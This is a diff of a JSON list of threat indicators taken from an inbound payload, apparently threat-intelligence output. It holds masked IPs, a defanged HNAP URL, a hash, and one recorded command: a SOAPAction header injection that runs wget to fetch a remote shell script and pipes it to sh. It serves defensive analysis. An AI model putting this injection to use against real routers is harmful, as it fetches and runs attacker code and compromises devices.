@@ -1,17 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.168.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "91.92.40.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -24,10 +12,16 @@
     "value": "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437"
+    "type": "ip",
+    "value": "190.179.168.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91.92.40.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -40,6 +34,12 @@
     "source": "strings",
     "type": "command",
     "value": "SOAPAction: \"hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dhnap2;"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437"
   },
   {
     "asn": "TechTies Inc.",
